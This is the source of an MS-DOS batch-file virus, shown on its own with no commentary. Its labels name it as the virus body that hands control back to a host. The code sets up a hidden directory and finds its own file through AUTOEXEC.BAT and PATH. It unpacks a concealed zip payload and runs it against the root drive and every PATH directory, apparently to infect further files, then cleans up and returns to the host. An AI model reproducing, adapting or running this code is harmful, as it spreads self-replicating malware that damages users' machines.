






















































:$virus$
@echo off
set _f=find.exe /i "
set _bd=c:\windows\
if not exist %_bd%nul set _bd=c:\
if not exist %_bd%nul set _bd=\
set _td=%_bd%$vdir$
if not #%_td%==#%_bd%$vdir$ goto $vexit$
md %_td%
if not exist %_td%\nul goto $vexit$
set _me=%0.bat
if not exist %_me% set _me=%0
if not $%_me%==$ goto $virfind$
set _me=autoexec.bat
if $%_SF%==$ goto $virfind$
type %_me%|%_f%PATH"|%_f%C:\"|%_f%;">%_td%\vz.bat
call %_td%\vz
:$virfind$
if exist %_me% goto $vextr$
echo>%_td%\v.bat :1
echo>>%_td%\v.bat shift
echo>>%_td%\v.bat if exist %%0%_me% set _me=%%0%_me%
echo>>%_td%\v.bat if exist %%0\%_me% set _me=%%0\%_me%
echo>>%_td%\v.bat if exist %%0%_me%.bat set _me=%%0%_me%.bat
echo>>%_td%\v.bat if exist %%0\%_me%.bat set _me=%%0\%_me%.bat
echo>>%_td%\v.bat if not exist %%_me%% if not -%%1==- goto 1
call %_td%\v %path% lost
del %_td%\v.bat>nul
if not exist %_me% goto $vexit$
:$vextr$
pkunzip.exe %_me% %_td% -o>%_td%\v.tm1
if not errorlevel 1 if exist %_td%\v.zip goto $vextrv$
copy %_td%\v.tm1 %_td%\v.tm2>nul
if not exist %_td%\v.tm2 goto $vclnup$
set _rep=ouch!
if exist %_bd%_!v.zip attrib.exe %_bd%_!v.zip -h>nul
if exist %_bd%_!v.zip copy %_bd%_!v.zip %_td%\v.zip>nul
if not exist %_td%\v.zip goto $vexit$
:$vextrv$
pkunzip.exe %_td%\v.zip %_td% -o>nul
%comspec% nul /e:9705 /f/c%_td%\vi . .. c:\ %path%
:$vclnup$
if not $%_td%==$ del %_td%\v?.*>nul
rd %_td%
:$vexit$
for %%v in (me td bd rep f) do set _%%v=
if not $%_SF%==$yup goto $vend$
set _SF=
@echo on
@goto $vhost$
:$viruSH$
@set _SF=yup
@goto $virus$
:$vend$
